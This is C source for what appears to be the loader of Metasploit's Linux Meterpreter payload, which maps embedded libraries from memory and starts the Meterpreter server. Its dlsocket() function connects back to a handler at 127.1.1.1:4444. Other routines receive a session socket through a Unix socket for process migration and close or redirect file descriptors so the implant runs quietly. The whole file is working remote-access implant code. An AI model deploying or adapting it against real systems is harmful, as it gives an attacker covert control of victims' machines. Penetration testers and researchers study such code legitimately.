/*
 * metasploit
 */

#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <endian.h>

#include <sys/sysmacros.h>

#include <asm/sigcontext.h>
#include <asm/ucontext.h>


#include "linker.h"
#include "linker_debug.h"
#include "linker_format.h"

#include "libc.h"
#include "libm.h"
#include "libcrypto.h"
#include "libssl.h"
#include "libsupport.h"
#include "libmetsrv_main.h"
#include "libpcap.h"

#include "../../common/compat_types.h"
#include "../../common/config.h"

struct libs {
	char *name;
	void *buf;
	size_t size;
	void *handle;
};

static struct libs libs[] = {
	{ "libc.so", libc, libc_length, NULL },
	{ "libm.so", libm, libm_length, NULL },
	{ "libpcap.so.1", libpcap, libpcap_length, NULL },
	{ "libcrypto.so.32", libcrypto, libcrypto_length, NULL },
	{ "libssl.so.32", libssl, libssl_length, NULL },
	{ "libsupport.so", libsupport, libsupport_length, NULL },
	{ "libmetsrv_main.so", libmetsrv_main, libmetsrv_main_length, NULL },
};

#define LIBC_IDX 0
#define LIBSUPPORT_IDX 5
#define METSRV_IDX  6

#include <pthread.h>

extern int (*pthread_mutex_lock_fp)(pthread_mutex_t *mutex);
extern int (*pthread_mutex_unlock_fp)(pthread_mutex_t *mutex);

int dlsocket(void *libc);
int pass_fd(void *libc); 
void perform_fd_cleanup(int *fd);

#define OPT_DEBUG_ENABLE  (1 << 0)
#define OPT_NO_FD_CLEANUP (1 << 1)
#define OPT_PASS_FD       (1 << 2)

int global_debug = 0;

char sock_path[UNIX_PATH_MAX] = "/tmp/meterpreter.sock";

/*
 * Map in libraries, and hand off execution to the meterpreter server
 */

unsigned metsrv_rtld(MetsrvConfig* config, int options)
{
	int i;
	int (*libc_init_common)();
	int (*server_setup)();
	struct stat statbuf;

	INFO("[ preparing to link. config = 0x%08x, fd = %d ]\n", (unsigned int)config, config->session.comms_fd);

	for(i = 0; i < sizeof(libs) / sizeof(struct libs); i++) {
		libs[i].handle = (void *) dlopenbuf(libs[i].name, libs[i].buf, libs[i].size);
		if(! libs[i].handle) {
			TRACE("[ failed to load %s/%08x/%08x, bailing ]\n", libs[i].name, libs[i].buf, libs[i].size);
			exit(1);
		}
	}

	libc_init_common = dlsym(libs[LIBC_IDX].handle, "__libc_init_common");
	TRACE("[ __libc_init_common is at %08x, calling ]\n", libc_init_common);
	libc_init_common();

	{
		int (*lock_sym)(pthread_mutex_t *mutex);
		int (*unlock_sym)(pthread_mutex_t *mutex);

		TRACE("[ setting pthread_mutex_lock_fp / pthread_mutex_unlock_fp ]\n");

		lock_sym = dlsym(libs[LIBC_IDX].handle, "pthread_mutex_lock");
		unlock_sym = dlsym(libs[LIBC_IDX].handle, "pthread_mutex_unlock");

		if(! lock_sym || !unlock_sym)
		{
			TRACE("[ libc mapping seems to be broken. exit()'ing ]");
			exit(-1);
		}

		pthread_mutex_lock_fp = lock_sym;
		pthread_mutex_unlock_fp = unlock_sym;
	}

	if (options & OPT_PASS_FD) {
		unsigned int (*sleep)(unsigned int seconds);
		int (*raise)(int sig);

		TRACE("[ Solving symbols ]\n");
		sleep = dlsym(libs[LIBC_IDX].handle, "sleep");
		if (!sleep) {
			TRACE("[	Failed to solve sleep ]\n");
			exit(-1);
		}

		raise = dlsym(libs[LIBC_IDX].handle, "raise");
		if (!raise) {
			TRACE("[	Failed to solve raise ]\n");
			exit(-1);
		}

		config->session.comms_fd = pass_fd(libs[LIBC_IDX].handle);
		if (config->session.comms_fd == -1) {
			exit(-1);
		} else {
			TRACE("[ Warning the migrating process and give to the server time to catch up... ]\n");
			raise(SIGTRAP);
			sleep(4);
		}
	} else if(fstat(config->session.comms_fd, &statbuf) == -1) {
		options = OPT_DEBUG_ENABLE;

		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
		config->session.comms_fd = dlsocket(libs[LIBC_IDX].handle);
		if(config->session.comms_fd == -1) {
			TRACE("[ failed to dlsocket() a connection. exit()ing ]\n");
			exit(-1);
		}
	}

	if(options & OPT_DEBUG_ENABLE) {
		void (*enable_debugging)();

		enable_debugging = dlsym(libs[LIBSUPPORT_IDX].handle, "enable_debugging");
		if(! enable_debugging) {
			TRACE("[ failed to find the enable_debugging function, exit()'ing ]\n");
			exit(-1);
		}
		global_debug = 1;
		enable_debugging();
	}

	TRACE("[ logging will stop unless OPT_NO_FD_CLEANUP is set ]\n");

	if(!(options & OPT_NO_FD_CLEANUP)) {
		perform_fd_cleanup((int*)&config->session.comms_fd);
	}

	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
	TRACE("[ metsrv server_setup is at 0x%x, calling ]\n", server_setup);
	server_setup(config);

	TRACE("[ metsrv_rtld(): server_setup() returned, exit()'ing ]\n");
	exit(1);
}

/*
 * Clean up the file descriptors associated with this process. If we hold fd's for server sockets, we can
 * interfere with process restarts, amongst other things.
 */

void perform_fd_cleanup(int *fd)
{
	int i, new_fd;
	struct stat statbuf;
	int dev_null = -1;

	for(i = 0; i < 1024; i++) {
		if(i == *fd) continue;
		if(fstat(i, &statbuf) == -1) continue;

		if(major(statbuf.st_rdev) == 1 && minor(statbuf.st_rdev) == 3) {
			dev_null = i;
			continue;
		}

		close(i);
	}

	// move server fd if <= 2

	if(*fd <= 2) {
		if((new_fd = dup2(*fd, dev_null == -1 ? 3 : dev_null == 3 ? 4 : 3)) == -1) {
			TRACE("[ unable to dup2 new fd ? should be fine. returning ]\n");
			return;
		}
		close(*fd);
		*fd = new_fd;
	}

	// try to open /dev/null if it does not exist atm.

	if(dev_null == -1) {
		dev_null = open("/dev/null", O_WRONLY);

		if(dev_null == -1) {
			TRACE("[ unable to open new /dev/null cause existing one doesn't exist ]\n");
			return;
		}
	}

	dup2(dev_null, 0);
	dup2(dev_null, 1);
	dup2(dev_null, 2);

	if(dev_null > 2) close(dev_null);
}

/*
 * If we have been executed directly (instead of staging shellcode /
 * rtldtest binary, we will have an invalid fd passed in. Here we
 * use the libc symbols to connect to the metasploit session
 */

int dlsocket(void *libc)
{
	int retcode = -1;
	int fd;
	int (*libc_socket)();
	int (*libc_connect)();
	int (*libc_inet_addr)();
	struct sockaddr_in sin;

	libc_socket = dlsym(libc, "socket");
	libc_connect = dlsym(libc, "connect");
	libc_inet_addr = dlsym(libc, "inet_addr");

	memset(&sin, 0, sizeof(struct sockaddr_in));

	do {
		fd = libc_socket(AF_INET, SOCK_STREAM, 0);
		if(fd == -1) break;

		sin.sin_addr.s_addr = libc_inet_addr("127.1.1.1");
		sin.sin_port = htons(4444);
		sin.sin_family = AF_INET;

		if(libc_connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) break;
		retcode = fd;

	} while(0);

	return retcode;

}

int pass_fd(void *libc) {
	int (*socket)(int domain, int type, int protocol);
	int (*connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	ssize_t (*recvmsg)(int sockfd, struct msghdr *msg, int flags);
	char * (*strncpy)(char *dst, const char *src, size_t n);
	int fd = -1;
		
	TRACE("[ Receiving socket file descriptor ]\n");
	TRACE("[ Solving symbols ]\n");

	socket = dlsym(libc, "socket");
	if (!socket) {
		TRACE("[	Failed to solve socket ]\n");
		return -1;
	}

	connect = dlsym(libc, "connect");
	if (!connect) {
		TRACE("[	Failed to solve connect ]\n");
		return -1;
	}

	recvmsg = dlsym(libc, "recvmsg");
	if (!recvmsg) {
		TRACE("[	Failed to solve recvmsg ]\n");
		return -1;
	}

	strncpy = dlsym(libc, "strncpy");
	if (!strncpy) {
		TRACE("[	Failed to solve strncpy ]\n");
		return -1;
	}

	TRACE("[ Creating the message structs ]\n");

	char buf[80];
	struct iovec vector;
	struct msghdr msg;
	struct cmsghdr * cmsg;

	int s, t, len;
	struct sockaddr_un remote;

	vector.iov_base = buf;
	vector.iov_len = 80;

	msg.msg_name = NULL;
	msg.msg_namelen = 0;
	msg.msg_iov = &vector;
	msg.msg_iovlen = 1;

	cmsg = alloca(sizeof(struct cmsghdr) + sizeof(fd));
	cmsg->cmsg_len = sizeof(struct cmsghdr) + sizeof(fd);
	msg.msg_control = cmsg;
	msg.msg_controllen = cmsg->cmsg_len;

	TRACE("[ Creating local unix socket ]\n");
	if ((s = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		TRACE("[	Failed to create UNIX SOCKET ]\n");
		return -1;
	}

	remote.sun_family = AF_UNIX;
	strncpy(remote.sun_path, sock_path, UNIX_PATH_MAX - 1);
	len = strlen(remote.sun_path) + sizeof(remote.sun_family);
	if (connect(s, (struct sockaddr *)&remote, len) == -1) {
		TRACE("[	ERROR connecting ]\n");
		return -1;
	}

	if (!recvmsg(s, &msg, 0)) {
		TRACE("[	ERROR recvmsg ]\n");
		return -1;
	}

	TRACE("[	Got file descriptor for '%s' ]\n", (char *) vector.iov_base);
	close(s);

	TRACE("[	Extracting fd... ]\n");
	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
	TRACE("[	fd for socket %d ]\n", fd);
	return fd;
}

extern soinfo *solist;

/*
 * This can't handle PROT_WRITE only memory :-)
 */

void dump_memory(char **ptr, int *len, char *prefix, long unsigned int location, size_t count)
{
	unsigned char discard[count];

	int fds[2];
	int rc;
	size_t n;

	if(pipe(fds) == -1) return;

	if(write(fds[1], (void *)location, count) == count) {
		if(read(fds[0], discard, count) == count) {
			n = 0;
			while(n < count) {

				rc = format_buffer(*ptr, *len, "%s+%4d: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x\n",
					prefix, n, discard[n + 0], discard[n + 1], discard[n + 2], discard[n + 3],
					discard[n + 4], discard[n + 5], discard[n + 6], discard[n + 7],
					discard[n + 8], discard[n + 9], discard[n + 10], discard[n + 11],
					discard[n + 12], discard[n + 13], discard[n + 14], discard[n + 15]
				);

				*ptr += rc;
				*len -= rc;

				n += 16;
			}

			rc = format_buffer(*ptr, *len, "\n");
			*ptr += rc;
			*len -= rc;
		}
	}

	close(fds[0]);
	close(fds[1]);
}


void *special_sig_stack;

void sigcrash(int signo, siginfo_t *info, void *context)
{
	struct ucontext *uc = (struct ucontext *)(context);
	struct sigcontext *sg = (struct sigcontext *)(& uc->uc_mcontext);
	char buf[8192], *p;
	int len, rc;
	int fd;
	soinfo *si;

	char filename[64];

	// reset signal handler, in case of another crash
	signal(signo, SIG_DFL);

	memset(buf, 0, sizeof(buf));

	p = buf;
	len = sizeof(buf);

	rc = format_buffer(p, len, "\n[ meterpreter crash -- caught signal %d ]\n\n", signo);
	p += rc;
	len -= rc;

	rc = format_buffer(p, len, "Special registers:\nEIP: 0x%08x ESP: 0x%08x EBP: 0x%08x\n\n",
		sg->eip, sg->esp, sg->ebp);
	p += rc;
	len -= rc;

	rc = format_buffer(p, len, "General registers:\nEAX: 0x%08x EBX: 0x%08x ECX: 0x%08x" \
		" EDX: 0x%08x ESI: 0x%08x EDI: 0x%08x\n\n",
		sg->eax, sg->ebx, sg->ecx, sg->edx, sg->esi, sg->edi);
	p += rc;
	len -= rc;

	rc = format_buffer(p, len, "Loaded libraries:\n");
	p += rc;
	len -= rc;

	for(si = solist; si; si = si->next) {
		rc = format_buffer(p, len, "%s %08x - %08x", si->name, si->base, si->base + si->size);
		p += rc;
		len -= rc;

		if(sg->eip >= si->base && sg->eip <= (si->base + si->size)) {
			rc = format_buffer(p, len, " [eip offset: %08x]", sg->eip - si->base);
			p += rc;
			len -= rc;
		}

		rc = format_buffer(p, len, "\n");
		p += rc;
		len -= rc;
	}

	rc = format_buffer(p, len, "\nRegister pointer contents:\n");
	p += rc;
	len -= rc;

	dump_memory(&p, &len, "EAX", sg->eax, 32);
	dump_memory(&p, &len, "EBX", sg->ebx, 32);
	dump_memory(&p, &len, "ECX", sg->ecx, 32);
	dump_memory(&p, &len, "EDX", sg->edx, 32);
	dump_memory(&p, &len, "ESI", sg->esi, 32);
	dump_memory(&p, &len, "EDI", sg->edi, 32);
	dump_memory(&p, &len, "EBP", sg->ebp, 64);
	dump_memory(&p, &len, "ESP", sg->esp, 64);
	dump_memory(&p, &len, "EIP", sg->eip, 16);

	fd = open("/proc/self/maps", O_RDONLY);
	if(fd != -1) {
		rc = read(fd, p, len);
		if(rc != -1) {
			p += rc;
			len -= rc;
		}
		close(fd);
	}

	// write file only if debug is enabled
	if (global_debug) {
		memset(filename, 0, sizeof(filename));
		format_buffer(filename, sizeof(filename) - 1, "/tmp/meterpreter.crash.%d", getpid());

		fd = open(filename, O_WRONLY|O_TRUNC|O_CREAT, 0644);
		if(fd) {
			write(fd, buf, 8192 - len);
			close(fd);
		}
	}

	write(2, buf, 8192 - len);

}

void sigchld(int signo)
{
	waitpid(-1, NULL, WNOHANG);
}

#define NEWSTKSIZE (4096 * 32)


void handle_crashes()
{
	struct sigaction sa;

	memset(&sa, 0, sizeof(struct sigaction));
	sa.sa_sigaction = sigcrash;
	sa.sa_flags = SA_SIGINFO | SA_ONSTACK;

	/*
	 * We set up a special signal handler stack on the chance that
	 * if our thread's esp is corrupt / too long, we can still execute
	 * the crash handler.
	 */

	special_sig_stack = mmap(NULL, NEWSTKSIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

	if(special_sig_stack == MAP_FAILED) {
		TRACE("[ (%s) unable to mmap for special stack. ]", __FUNCTION__);

		sa.sa_flags &= ~SA_ONSTACK;
		special_sig_stack = NULL;
	} else {
		stack_t newstk;

		newstk.ss_sp = special_sig_stack;
		newstk.ss_flags = 0;
		newstk.ss_size = NEWSTKSIZE;

		if(sigaltstack(&newstk, NULL) == -1) {
			TRACE("[ (%s) unable to sigaltstack. errno = %d ]", __FUNCTION__, errno);
			munmap(special_sig_stack, NEWSTKSIZE);
			special_sig_stack = NULL;
			sa.sa_flags &= ~SA_ONSTACK;
		}
	}

	sigaction(SIGSEGV, &sa, NULL); sigaction(SIGILL, &sa, NULL);
	sigaction(SIGFPE, &sa, NULL); sigaction(SIGSYS, &sa, NULL);
	sigaction(SIGABRT, &sa, NULL);

}

/*
 * This is the entry point for the meterpreter payload, either as a stand alone executable, or a
 * payload executing on the remote machine.
 *
 * If executed as a stand alone, int fd will be invalid. Later on, once libc has been loaded,
 * it will connect to the metasploit meterpreter server.
 */

void _start(MetsrvConfig* config, int options)
{
	alarm(0);			// clear out any pending alarms.

	signal(SIGCHLD, sigchld);	// reap pids
	signal(SIGPIPE, SIG_IGN);	// ignore read/write pipe errors, make them return -1.

	handle_crashes();		// try to make debugging a little easier.

	metsrv_rtld(config, options);
}
